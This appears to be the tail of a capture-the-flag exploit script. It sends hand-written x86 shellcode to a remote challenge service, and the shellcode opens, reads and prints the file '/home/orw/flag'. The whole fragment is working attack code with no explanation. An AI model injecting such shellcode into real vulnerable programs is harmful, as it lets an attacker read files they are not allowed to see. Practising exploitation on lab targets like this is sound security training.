...
shellcode_clear = "\x68\x61\x67\x00\x00\x68\x77\x2F\x66\x6C\x68\x65\x2F\x6F\x72\x68\x2F\x68\x6F\x6D\x89\xE3\x31\xC9\x31\xC0\x83\xC0\x05\xCD\x80\x83\xEC\x30\x8D\x0C\x24\x89\xC3\x31\xD2\x83\xC2\x30\x31\xC0\x83\xC0\x03\xCD\x80\x31\xDB\x83\xC3\x01\x31\xC0\x83\xC0\x04\xCD\x80"
r.recvuntil(':')
r.sendline(shellcode_clear)
r.interactive()
